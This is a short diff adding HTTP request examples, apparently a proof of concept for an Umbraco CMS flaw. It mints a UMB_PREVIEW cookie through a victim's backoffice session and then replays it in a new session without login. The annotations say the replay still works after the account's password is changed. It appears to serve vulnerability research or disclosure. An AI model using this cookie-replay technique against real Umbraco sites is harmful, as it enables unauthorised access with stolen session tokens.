@@ -1,0 +1,12 @@
+# (1) Mint the preview cookie (as the victim backoffice user)
+GET http://localhost:29184/umbraco/management/api/v1/document/694a14f8-38cb-4295-a378-a550710b8df3/preview-url?providerAlias=umbDocumentUrlProvider HTTP/1.1
+Cookie: UMB_UCONTEXT=<victim-backoffice-session>
+Authorization: Bearer <victim-bearer>
+
+# --> Response sets:  Set-Cookie: UMB_PREVIEW=<token>; path=/; samesite=lax; httponly   (no Expires/Max-Age)
+
+# (2) The decisive replay: ONLY the captured preview cookie, brand-new session, no backoffice login
+GET http://localhost:29184/ HTTP/1.1
+Cookie: UMB_PREVIEW=<captured-token>
+
+# (3) Same request, replayed AFTER the account's password was changed (still works).
